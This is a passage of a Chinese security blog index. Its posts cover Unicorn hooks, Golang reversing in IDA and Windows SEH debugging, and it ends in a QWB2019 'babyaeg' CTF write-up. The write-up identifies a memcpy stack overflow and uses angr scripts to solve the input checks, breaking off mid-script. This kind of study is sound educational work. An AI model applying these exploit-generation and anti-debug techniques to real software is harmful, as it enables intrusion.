<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def hook_mem_access(mu,access,size,value,user_data):</span><br><span class="line">	if access == UC_MEM_WRITE:</span><br><span class="line">        print(&quot;&gt;&gt;&gt; Memory is being WRITE at 0x%x, data size = %u, data value = 0x%x&quot; \</span><br><span class="line">                %(address, size, value))</span><br><span class="line">    else:   # READ</span><br><span class="line">        print(&quot;&gt;&gt;&gt; Memory is being READ at 0x%x, data size = %u&quot; \</span><br><span class="line">                %(address, size))</span><br><span class="line">mu.hook_add(UC_HOOK_MEM_WRITE,hook_mem_access);</span><br><span class="line">mu.hook_add(UC_HOOK_MEM_READ,hook_mem_access);# hook内存写入及读出</span><br></pre></td></tr></table></figure>
<p>一些有用的API</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">saved_context = mu.context_save()#保存寄存器的状态</span><br><span class="line">mu.context_restore(saved_context)#恢复</span><br><span class="line">mu.mem_read(addr,size)#从内存中读入</span><br><span class="line">mu.reg_read(UC_X86_REG_RBP);#读取寄存器的内容</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Golang-Reverse总结" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/07/21/Golang-Reverse总结/" class="article-date">
      <time datetime="2019-07-21T15:39:08.000Z" itemprop="datePublished">2019-07-21</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/21/Golang-Reverse总结/">Golang Reverse总结</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="字符串篇"><a href="#字符串篇" class="headerlink" title="字符串篇"></a>字符串篇</h1><p>我们再ida中反编译一段简单的代码来初步识别Golang的底层字符串操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import &quot;fmt&quot;</span><br><span class="line">func main() &#123;</span><br><span class="line">	var a,b string;</span><br><span class="line">	a = &quot;123&quot;;</span><br><span class="line">	fmt.Scanf(&quot;%s&quot;,&amp;b);</span><br><span class="line">	fmt.Println(a+b);</span><br><span class="line">   // fmt.Println(&quot;Hello, World!&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在IDA中反编译出的Golang的代码可读性非常差，因此我们直接分析其汇编代码<br>首先我们来分析一下fmt.Scanf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000049E4EF mov     rcx, cs:os_Stdin</span><br><span class="line">.text:000000000049E4F6 lea     rdx, go_itab__os_File_io_Reader</span><br><span class="line">.text:000000000049E4FD mov     [rsp+80h+var_80], rdx</span><br><span class="line">.text:000000000049E501 mov     [rsp+80h+var_78], rcx</span><br><span class="line">.text:000000000049E506 lea     rcx, unk_4D2A8B  		//&quot;%s&quot;</span><br><span class="line">.text:000000000049E50D mov     [rsp+80h+var_70], rcx</span><br><span class="line">.text:000000000049E512 mov     [rsp+80h+var_68], 2</span><br><span class="line">.text:000000000049E51B lea     rcx, [rsp+80h+var_18] 	</span><br><span class="line">.text:000000000049E520 mov     [rsp+80h+var_60], rcx</span><br><span class="line">.text:000000000049E525 mov     [rsp+80h+var_58], 1</span><br><span class="line">.text:000000000049E52E mov     [rsp+80h+var_50], 1</span><br><span class="line">.text:000000000049E537 call    fmt_Fscanf</span><br><span class="line">.text:000000000049E53C mov     rax, [rsp+80h+var_30]</span><br><span class="line">.text:000000000049E541 mov     rcx, [rax]</span><br><span class="line">.text:000000000049E544 mov     rax, [rax+8]</span><br></pre></td></tr></table></figure></p>
<p>在识别fmt.Scanf的各个参数时，我们只需要重点关注格式化字符串，它一般的传参形式为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea rcx , st_addr</span><br><span class="line">mov [rsp+xx],rcx 传入字符串地址</span><br><span class="line">mov [rsp+yy],3 传入字符串的长度（这是因为golang中字符串全部都放在了一块，而没有用\x00来截断，因此需要指定长度）</span><br></pre></td></tr></table></figure></p>
<p>而传入的参数会保存在栈中，我们只需要观察函数的返回值就能找到（这里需要注意的是Golang里函数的返回值可能不止一个，且不保存在寄存器中，而是用栈来传递）可以注意到，这里函数返回了一个参数，也就是读入的数据类型string<br><code>.text:000000000049E53C mov     rax, [rsp+80h+var_30]</code><br>由于string类型在Golang内存中的表示方法可以近似等价为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct string&#123;</span><br><span class="line">	QWORD point_to_str;</span><br><span class="line">	QWORD len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此程序在此处分别取出了字符串，和它的长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000049E541 mov     rcx, [rax]</span><br><span class="line">.text:000000000049E544 mov     rax, [rax+8]</span><br></pre></td></tr></table></figure></p>
<p>字符串进行+运算时，需要调用runtime_concatstring2函数，该函数的参数就是若干个字符串地址，和他们对应的长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000049E550 lea     rdx, const_st_123</span><br><span class="line">.text:000000000049E557 mov     [rsp+80h+var_78], rdx</span><br><span class="line">.text:000000000049E55C mov     [rsp+80h+var_70], 3</span><br><span class="line">.text:000000000049E565 mov     [rsp+80h+var_68], rcx</span><br><span class="line">.text:000000000049E56A mov     [rsp+80h+var_60], rax</span><br><span class="line">.text:000000000049E56F call    runtime_concatstring2</span><br></pre></td></tr></table></figure></p>
<p>而函数的返回值有两个，一个是合并后的字符串，一个是长度，并且返回的两个参数并不是一个string的对象，因此需要调用runtime_convTstring用这两个参数来创建一个string的对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000049E574 mov     rax, [rsp+80h+var_50]</span><br><span class="line">.text:000000000049E579 mov     rcx, [rsp+80h+var_58]</span><br><span class="line">.text:000000000049E57E mov     [rsp+80h+var_80], rcx</span><br><span class="line">.text:000000000049E582 mov     [rsp+80h+var_78], rax</span><br><span class="line">.text:000000000049E587 call    runtime_convTstring</span><br></pre></td></tr></table></figure></p>
<p>创建后的string对象就可以用fmt.Println来输出了，这里和fmt.Scanf原理差不多，就不继续解释了</p>
<p>参考链接：<br><a href="https://draveness.me/golang/basic/golang-function-call.html" target="_blank" rel="noopener">https://draveness.me/golang/basic/golang-function-call.html</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-windows下vc-异常处理机制" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/07/14/windows下vc-异常处理机制/" class="article-date">
      <time datetime="2019-07-14T00:28:40.000Z" itemprop="datePublished">2019-07-14</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/14/windows下vc-异常处理机制/">windows下vc++异常处理机制</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="异常处理流程分析"><a href="#异常处理流程分析" class="headerlink" title="异常处理流程分析"></a>异常处理流程分析</h1><ul>
<li>首先当发生用户态异常时，os会接收该异常，并判断调试器是否要处理该异常，若不处理，则会进入<code>KiUserExceptionDispatcher</code>来尝试对该异常进行分发</li>
<li>调用<code>RtlDispatchException</code>来寻找异常处理器，首先搜索VEH链，若无法处理该异常，则通过SEH来处理</li>
<li>SEH处理时，会循环遍历SEH链表，调用<code>RtlExcuteHandlerForException</code>,检查是否有处理其异常的handler，若返回<code>EXCEPTION_EXECUTE_HANDLER</code>，表示该异常被处理了；若返回<code>EXCEPTION_CONTINUE_SEARCH</code>，表示继续遍历SEH链的下一项。若找不到处理该异常的handler，则调用<code>UnhandledExceptionFilter</code>来进行处理（该handler位于SEH链的倒数第二个），若仍然无法处理，则调用SEH链的最后一个表项，退出遍历</li>
<li><code>UnhandledExceptionFilter</code>也叫SEH顶层异常处理TopLevelExceptionHandler，在调用<code>UnhandledExceptionFilter</code>处理时，会首先检查是否处于调试状态，若处于调试状态，则会将该异常交给调试器去处理（而调试器几乎不会去处理这个异常，这就导致即使在调试器中开启了忽略异常的选项，当需要调用顶层异常处理的程序在调试器中直接运行时，也无法正常进行异常处理），否则，将会调用用户注册的异常处理函数</li>
<li>最后检查异常是否被正常处理，若不能处理，则调用<code>ZwRaiseException</code>终止程序，否则调用<code>ZwContinue</code>返回到一个位置继续执行，返回位置会通过ebx传入栈中</li>
</ul>
<p>VEH异常处理函数返回值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_CONTINUE_SEARCH</span><br></pre></td></tr></table></figure>
<p>SEH异常处理函数返回值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_EXECUTE_HANDLER		1 </span><br><span class="line">该异常被处理了</span><br><span class="line">EXCEPTION_CONTINUE_SEARCH		0 </span><br><span class="line">无法处理该异常，继续搜索SEH链的下一项</span><br><span class="line">EXCEPTION_CONTINUE_EXECUTION	-1</span><br><span class="line">程序试图重新执行引发异常的代码,但是并不推荐这样做.</span><br></pre></td></tr></table></figure>
<p>顶层SEH异常处理函数的返回值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define EXCEPTION_EXECUTE_HANDLER      1</span><br><span class="line">表示该异常被处理了，直接杀死该进程</span><br><span class="line">#define EXCEPTION_CONTINUE_SEARCH      0</span><br><span class="line">会查找系统的注册表，尝试去找到一个实时的调试器来处理</span><br><span class="line">#define EXCEPTION_CONTINUE_EXECUTION 	-1</span><br><span class="line">程序试图重新执行引发异常的代码,但是并不推荐这样做.</span><br></pre></td></tr></table></figure>
<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>首先<code>bp KiUserExceptionDispatcher</code>下断<br><img src="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/Snipaste_2019-07-14_20-28-35.png" alt></p>
<p>跟入<code>RtlDispatchException</code>，单步直到找到<code>RtlpCallVetoredHandler</code>调用VEH链的位置，根据其返回值判断是否成功处理异常<br><img src="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/20190715095524.png" alt></p>
<p>单步，找到<code>RtlpExecuteHandlerForException</code>，在此处遍历SEH链的每一个handler来尝试处理该异常，可以根据返回值来判断处理的结果</p>
<p><img src="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/20190715095923.png" alt></p>
<p>跟入这个函数，可以找到调用handler的call</p>
<p><img src="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/20190715100202.png" alt></p>
<p>现在我们定位到SEH链的倒数第二个，也就是找到<code>UnhandledExceptionFilter</code>,我们继续跟入<code>RtlpExecuteHandlerForException</code></p>
<p>找到<code>_except_handler4_common</code>，</p>
<p>找到<code>_EH4_CallFilterFunc</code></p>
<p>找到<code>call esi</code></p>
<p><img src="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/20190715101009.png" alt></p>
<p>跟入<code>UnhandledExceptionFilter</code>，可以发现在该函数内部，检查了是否处于调试状态，我们可以手动将返回值置0，使得程序能正常执行SEH顶层异常处理</p>
<p><img src="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/20190715101141.png" alt></p>
<p>过掉检查之后，就开始调用TopLevelExceptionHandler，也就是顶层的异常处理函数</p>
<p><img src="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/20190715101407.png" alt></p>
<p>异常处理成功，调用ZwContinue返回</p>
<p><img src="C:\Users\lxf\AppData\Roaming\Typora\typora-user-images\1563157069651.png" alt></p>
<p>参考链接</p>
<ul>
<li><p><a href="https://xz.aliyun.com/t/5588#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/5588#toc-6</a></p>
</li>
<li><p><a href="https://blog.csdn.net/a893574301/article/details/80507978#comments?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://blog.csdn.net/a893574301/article/details/80507978#comments?tdsourcetag=s_pctim_aiomsg</a></p>
</li>
<li><p><a href="http://www.youngroe.com/2015/09/05/Windows/windows-exception-handling-mechanism/" target="_blank" rel="noopener">http://www.youngroe.com/2015/09/05/Windows/windows-exception-handling-mechanism/</a></p>
</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-QWB2019-babyaeg-详解" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/05/28/QWB2019-babyaeg-详解/" class="article-date">
      <time datetime="2019-05-28T13:13:11.000Z" itemprop="datePublished">2019-05-28</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/28/QWB2019-babyaeg-详解/">QWB2019 babyaeg 详解</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>首先，让我们先来简单的逆向一下这个程序，该程序的接收命令行参数作为输入，然后将我们的输入16进制解码以后放到了bss段上的一个数组，将我们的输入分奇偶xor了两个常量后，进入了若干干相似的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">if ( a1 == 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_4539579(1LL, 2LL, 3LL, 4LL, 5LL, 6LL);</span><br><span class="line">    srand(v4);</span><br><span class="line">    dword_473CDE0 = strlen(a2[1]) &gt;&gt; 1;</span><br><span class="line">    if ( dword_473CDE0 &lt;= 1000 )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = 0;</span><br><span class="line">      v14 = 0;</span><br><span class="line">      while ( v15 &lt; 2 * dword_473CDE0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = a2[1][v15];</span><br><span class="line">        v8 = a2[1][v15 + 1];</span><br><span class="line">        v9 = 0;</span><br><span class="line">        v5 = v14++;</span><br><span class="line">        __isoc99_sscanf(&amp;v7, &quot;%02hhx&quot;, &amp;byte_473D120[v5]);</span><br><span class="line">        v15 += 2;</span><br><span class="line">      &#125;</span><br><span class="line">      for ( i = 0; i &lt; dword_473CDE0; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( (_BYTE)v13 == -31 &amp;&amp; (_BYTE)v12 == 29 &amp;&amp; 8 * (12 * (_BYTE)v13 + (_BYTE)v12) - (_BYTE)v11 == 57 )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = v13++;</span><br><span class="line">          v12 = v6;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( i &amp; 1 )</span><br><span class="line">          byte_473D120[i] ^= 0xC9u;</span><br><span class="line">        else</span><br><span class="line">          byte_473D120[i] ^= 0xC0u;</span><br><span class="line">        if ( (_BYTE)v13 == -16 &amp;&amp; (_BYTE)v12 == 8 &amp;&amp; 35 * (_BYTE)v13 + 41 * (_BYTE)v12 - (_BYTE)v11 == 70 )</span><br><span class="line">          v11 = ++v13;</span><br><span class="line">      &#125;</span><br><span class="line">      puts(&quot;payload encoded. let&apos;s go!&quot;);</span><br><span class="line">      sub_45394D6(byte_473D120[0], byte_473D121, byte_473D122);</span><br><span class="line">      puts(&quot;end of program&quot;);</span><br><span class="line">      result = 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;payload length exceeds 1000byte&quot;);</span><br><span class="line">      result = 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;usage : ./aeg [hex encoded payload]&quot;);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>第一种类型的check，解若干个方程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">result = a3;</span><br><span class="line">  if ( a1 != -47 )</span><br><span class="line">    return result;</span><br><span class="line">  result = 122 - a2;</span><br><span class="line">  if ( a2 != 63 )</span><br><span class="line">    return result;</span><br><span class="line">  result = 48 * a1 + 45 * a2 - a3;</span><br><span class="line">  if ( result == 66 )</span><br><span class="line">    result = sub_4539457(byte_473D123, byte_473D124, byte_473D125);</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第二种类型的check，根据输入取数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v13 = a1 - 48;</span><br><span class="line">  v7 = 2;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  v9 = 4;</span><br><span class="line">  v10 = 1;</span><br><span class="line">  v11 = 3;</span><br><span class="line">  v2 = 8;</span><br><span class="line">  v3 = 7;</span><br><span class="line">  v4 = 6;</span><br><span class="line">  v5 = 5;</span><br><span class="line">  v6 = 9;</span><br><span class="line">  v12 = (a1 - 48) % 5;</span><br><span class="line">  result = (unsigned int)*(&amp;v2 + *(&amp;v7 + v12));</span><br><span class="line">  if ( (_DWORD)result == 6 )</span><br><span class="line">    result = sub_4538B9C((unsigned __int8)byte_473D151);</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第三种类型的check</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">void *sub_45382EF()</span><br><span class="line">&#123;</span><br><span class="line">  const char *v0; // rax</span><br><span class="line">  void *result; // rax</span><br><span class="line">  char dest; // [rsp+0h] [rbp-50h]</span><br><span class="line">  __int64 v3; // [rsp+8h] [rbp-48h]</span><br><span class="line">  const char *v4; // [rsp+10h] [rbp-40h]</span><br><span class="line">  _BYTE *v5; // [rsp+18h] [rbp-38h]</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-30h]</span><br><span class="line">  __int64 i; // [rsp+28h] [rbp-28h]</span><br><span class="line">  const char *v8; // [rsp+30h] [rbp-20h]</span><br><span class="line">  const char *v9; // [rsp+38h] [rbp-18h]</span><br><span class="line">  _BYTE *v10; // [rsp+40h] [rbp-10h]</span><br><span class="line">  void *src; // [rsp+48h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v10 = &amp;unk_473D153;</span><br><span class="line">  v9 = &quot;RSiX4TvM&quot;;</span><br><span class="line">  v8 = &quot;RSiX4TvM&quot;;</span><br><span class="line">  for ( i = 0LL; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = v8++;</span><br><span class="line">    if ( !*v0 )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = i;</span><br><span class="line">  while ( *v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v10;</span><br><span class="line">    v4 = v9;</span><br><span class="line">    v3 = v6;</span><br><span class="line">    while ( --v3 &amp;&amp; *v5 &amp;&amp; *v4 &amp;&amp; *v5 == *v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v5;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( *v5 == *v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v10;</span><br><span class="line">      goto LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v10;</span><br><span class="line">  &#125;</span><br><span class="line">  result = 0LL;</span><br><span class="line">LABEL_16:</span><br><span class="line">  src = result;</span><br><span class="line">  if ( result )</span><br><span class="line">    result = memcpy(&amp;dest, src, (size_t)&amp;byte_473D120[dword_473CDE0 - (_QWORD)src]);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到，第三种类型的check将我们的输入的[51:51+8]与一明文进行比对，然后调用memcpy，把input[51:]全部拷贝到了dest，显然这里就是程序的漏洞点，那么我们只需要过掉前面的check就可以触发漏洞，但是由于程序是在服务端动态生成的，这就导致生成的程序相似，但是不完全相同<br>具体可以包括以下部分</p>
<ul>
<li><p>xor的值不同</p>
</li>
<li><p>三种类型的check的参数不同</p>
</li>
<li><p>dest相对于rbp的偏移不同</p>
</li>
<li><p>程序入口点不同</p>
</li>
<li><p>程序中还随机插入了一些无关的代码或者函数，导致我们无法预知一些我们感兴趣的地址相对入口点的偏移</p>
</li>
</ul>
<p>这些问题导致我们没有很好的规律来帮助我们来生成exlpoit，于是我决定使用angr来解决这个问题</p>
<h2 id="利用angr分析二进制文件"><a href="#利用angr分析二进制文件" class="headerlink" title="利用angr分析二进制文件"></a>利用angr分析二进制文件</h2><p>首先我们先得找到main函数的地址,main函数的地址会在<code>call __libc_start_main</code>时被载入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proj = angr.Project(&quot;1.elf&quot;,auto_load_libs=True);</span><br><span class="line">state = proj.factory.full_init_state();</span><br><span class="line">sm = proj.factory.simulation_manager(state);</span><br><span class="line">sm.explore( find=proj.entry+0x24 ).move(&apos;found&apos;,&apos;active&apos;);</span><br><span class="line">main_addr = sm.one_active.solver.eval( sm.one_active.regs.rdi );</span><br></pre></td></tr></table></figure>
<p>找到main函数的所有基本块,再从这些基本块中找到调用第一个check函数的基本块，最终获取第一个check函数的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cfg = proj.analyses.CFGFast(regions=[(proj.entry, proj.loader.main_object.max_addr)], force_complete_scan=False);</span><br><span class="line">main_func = cfg.functions.function(main_addr);</span><br><span class="line">block_addr = sorted(main_func.get_call_sites())[-2];</span><br><span class="line">cur_func_addr = main_func.get_call_target(block_addr);</span><br></pre></td></tr></table></figure></p>
<p>通过符号执行来求得第一类check的所有解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ans = &quot;&quot;;</span><br><span class="line">while len(ans)!=48:</span><br><span class="line">	a = claripy.BVS(&apos;x&apos;, 8);</span><br><span class="line">	b = claripy.BVS(&apos;y&apos;, 8);</span><br><span class="line">	c = claripy.BVS(&apos;z&apos;, 8);</span><br><span class="line">		</span><br><span class="line">	func = cfg.functions.function(cur_func_addr);</span><br><span class="line">		</span><br><span class="line">	state = proj.factory.call_state(cur_func_addr,a,b,c);</span><br><span class="line">		</span><br><span class="line">	sm = proj.factory.simulation_manager(state);</span><br><span class="line">	target_block_addr = func.get_call_sites()[0];</span><br><span class="line">	# print &apos;target_block_addr&apos;,hex(target_block_addr);</span><br><span class="line">	# print func.get_call_sites();</span><br><span class="line">		</span><br><span class="line">	sm.explore( find=target_block_addr );</span><br><span class="line">	ans+=chr( sm.found[0].solver.eval(a) );</span><br><span class="line">	ans+=chr( sm.found[0].solver.eval(b) );</span><br><span class="line">	ans+=chr( sm.found[0].solver.eval(c) );</span><br><span class="line">	cur_func_addr = func.get_call_target(target_block_addr);</span><br></pre></td></tr></table></figure></p>
<p>由于第二类check通过符号执行的方式求解的速度太慢，因此我决定爆破第二类check的答案，但用angr来爆破时需要注意一个问题，就是不能产生符号执行，因为我们给的输入是固定值，一旦产生了符号执行，就会产生针对所有分支的可行路径，同时针对某一状态也会有相应的约束产生，因此，在此题中，我们只需要判断是否有约束产生，就能判断是否发生了符号执行（这里的话我也不理解为什么会产生符号执行）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">while len(ans)!=51:</span><br><span class="line">	func = cfg.functions.function(cur_func_addr);</span><br><span class="line">	target_block_addr = func.get_call_sites()[0];</span><br><span class="line">		</span><br><span class="line">	for i in range(64):</span><br><span class="line">		state = proj.factory.call_state(cur_func_addr,i+48);</span><br><span class="line">		sm = proj.factory.simulation_manager(state);</span><br><span class="line">		sm.explore( find=target_block_addr );</span><br><span class="line">		if 